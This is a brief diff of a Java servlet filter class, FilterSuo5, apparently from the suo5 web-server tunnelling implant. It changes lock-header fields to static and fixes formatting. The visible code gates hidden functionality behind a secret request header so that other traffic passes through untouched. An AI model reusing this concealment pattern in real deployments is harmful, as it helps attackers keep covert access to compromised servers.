@@ -29,8 +29,8 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
 
     InputStream gInStream;
     OutputStream gOutStream;
-    private String lockHeaderKey;
-    private String lockHeaderValue;
+    private static String lockHeaderKey;
+    private static String lockHeaderValue;
 
     public FilterSuo5() {
     }
@@ -50,7 +50,7 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
     private void task(Object request, Object response, Object filterChain) {
         try {
             String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
-            if(lv == null || !lv.contains(lockHeaderValue)) {
+            if (lv == null || !lv.contains(lockHeaderValue)) {
                 if (filterChain != null) {
                     doFilter(request, response, filterChain);
                 }
@@ -595,7 +595,7 @@ public class FilterSuo5 implements InvocationHandler, Runnable, HostnameVerifier
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
         try {
             return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
+        } catch (Exception e) {
             return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
         }
     }
